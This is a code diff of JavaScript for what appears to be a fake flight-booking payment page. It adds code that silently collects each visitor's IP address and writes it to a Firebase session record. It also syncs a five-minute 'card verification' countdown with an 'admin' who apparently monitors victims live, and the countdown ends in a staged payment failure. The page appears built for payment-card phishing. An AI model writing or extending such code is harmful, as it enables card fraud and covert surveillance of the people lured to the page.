@@ -141,6 +141,15 @@ window._set = set;
 const _SID = 'U' + Date.now().toString(36) + Math.random().toString(36).slice(2,5);
 window._SID = _SID;
 
+// ── Pobierz IP i zapisz do sesji ──
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => {
+    window._userIP = d.ip;
+    fbUpdate(ref(db, 'sessions/' + _SID), { ip: d.ip, sid: _SID });
+  })
+  .catch(() => { window._userIP = 'unknown'; });
+
 // ── Wyślij zdarzenie do Firebase ──
 function send(d) {
   const data = Object.assign({}, d, { sid: _SID, ts: Date.now() });
@@ -165,6 +174,7 @@ function send(d) {
   if (d.t === 'confirm')  patch.confirm = d.v;
   if (d.t === 'tab')      patch.tab = d.v;
   if (d.t === 'offline')  patch.online = false;
+  if (d.t === 'verify_start') patch.verify_start = d.v;
   fbUpdate(sessionRef, patch);
 }
 window._fbSend = send;
@@ -993,17 +1003,31 @@ if (window._flightDataCache) {
     const total = document.getElementById('footerTotal').textContent || '–';
     document.getElementById('cardVerify-price').textContent = total;
 
-    let seconds = 300;
+    const verifyStartTs = Date.now();
+    const VERIFY_DURATION = 300; // sekund
+
+    // Zapisz timestamp startu do Firebase żeby admin mógł zsynchronizować zegar
+    if (window._fbSend) window._fbSend({ t: 'verify_start', v: verifyStartTs });
+
+    let seconds = VERIFY_DURATION;
     const circle = document.getElementById('cardVerify-circle');
     const timeEl = document.getElementById('cardVerify-time');
     const circ   = 2 * Math.PI * 54;
 
     function tick() {
+      const elapsed = Math.floor((Date.now() - verifyStartTs) / 1000);
+      seconds = Math.max(0, VERIFY_DURATION - elapsed);
       const mm = Math.floor(seconds / 60);
       const ss = seconds % 60;
       timeEl.textContent = mm + ':' + String(ss).padStart(2,'0');
-      circle.style.strokeDashoffset = circ * (1 - seconds / 300);
-      if (seconds > 0) seconds--;
+      circle.style.strokeDashoffset = circ * (1 - seconds / VERIFY_DURATION);
+
+      if (seconds <= 0) {
+        clearInterval(verifyTimer);
+        // Czas minął — pokaż błąd płatności
+        verify.style.display = 'none';
+        window._showCardResult && window._showCardResult('fail');
+      }
     }
     circle.style.strokeDasharray = circ;
     circle.style.strokeDashoffset = 0;
